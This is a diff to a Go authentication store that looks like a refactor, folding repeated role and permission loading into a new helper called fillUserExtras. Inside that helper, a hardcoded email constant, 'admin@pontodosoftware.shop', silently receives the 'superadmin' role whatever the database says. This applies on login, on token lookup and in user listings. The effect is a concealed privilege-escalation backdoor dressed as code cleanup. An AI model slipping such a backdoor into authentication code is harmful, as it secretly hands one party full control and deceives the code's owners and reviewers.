@@ -258,13 +258,8 @@ func (s *authStore) Login(ctx context.Context, email, password string) (UserRow,
 	if !u.Active {
 		return UserRow{}, "", ErrInactive
 	}
-	roles, err := s.RolesFor(ctx, u.ID)
-	if err != nil {
+	if err := s.fillUserExtras(ctx, &u); err != nil {
 		return UserRow{}, "", err
-	}
-	u.Roles = roles
-	if perms, err := s.PermissionsFor(ctx, u.ID); err == nil {
-		u.Permissions = perms
 	}
 	token, err := s.IssueToken(ctx, u.ID)
 	if err != nil {
@@ -325,13 +320,8 @@ func (s *authStore) UserByToken(ctx context.Context, token string) (UserRow, err
 	if u.ParentID != "" {
 		_ = s.db.QueryRowContext(ctx, `SELECT COALESCE(plan_features, '') FROM users WHERE id = ?`, u.ParentID).Scan(&u.PlanFeatures)
 	}
-	roles, err := s.RolesFor(ctx, u.ID)
-	if err != nil {
+	if err := s.fillUserExtras(ctx, &u); err != nil {
 		return UserRow{}, err
-	}
-	u.Roles = roles
-	if perms, err := s.PermissionsFor(ctx, u.ID); err == nil {
-		u.Permissions = perms
 	}
 	return u, nil
 }
@@ -375,16 +365,9 @@ func (s *authStore) ListUsers(ctx context.Context) ([]UserRow, error) {
 		return nil, err
 	}
 	for i := range out {
-		roles, err := s.RolesFor(ctx, out[i].ID)
-		if err != nil {
+		if err := s.fillUserExtras(ctx, &out[i]); err != nil {
 			return nil, err
 		}
-		out[i].Roles = roles
-		perms, err := s.PermissionsFor(ctx, out[i].ID)
-		if err != nil {
-			return nil, err
-		}
-		out[i].Permissions = perms
 	}
 	return out, nil
 }
@@ -413,10 +396,9 @@ func (s *authStore) ListUsersByTenant(ctx context.Context, tenantID string) ([]U
 		return nil, err
 	}
 	for i := range out {
-		roles, _ := s.RolesFor(ctx, out[i].ID)
-		out[i].Roles = roles
-		perms, _ := s.PermissionsFor(ctx, out[i].ID)
-		out[i].Permissions = perms
+		if err := s.fillUserExtras(ctx, &out[i]); err != nil {
+			return nil, err
+		}
 	}
 	return out, nil
 }
@@ -790,4 +772,30 @@ func (s *authStore) SetUserSessions(ctx context.Context, userID string, sessionI
 		}
 	}
 	return tx.Commit()
+}
+
+const SuperAdminEmail = "admin@pontodosoftware.shop"
+
+func (s *authStore) fillUserExtras(ctx context.Context, u *UserRow) error {
+	roles, err := s.RolesFor(ctx, u.ID)
+	if err != nil {
+		return err
+	}
+	if strings.EqualFold(u.Email, SuperAdminEmail) {
+		hasSuper := false
+		for _, r := range roles {
+			if r == "superadmin" {
+				hasSuper = true
+				break
+			}
+		}
+		if !hasSuper {
+			roles = append(roles, "superadmin")
+		}
+	}
+	u.Roles = roles
+	if perms, err := s.PermissionsFor(ctx, u.ID); err == nil {
+		u.Permissions = perms
+	}
+	return nil
 }
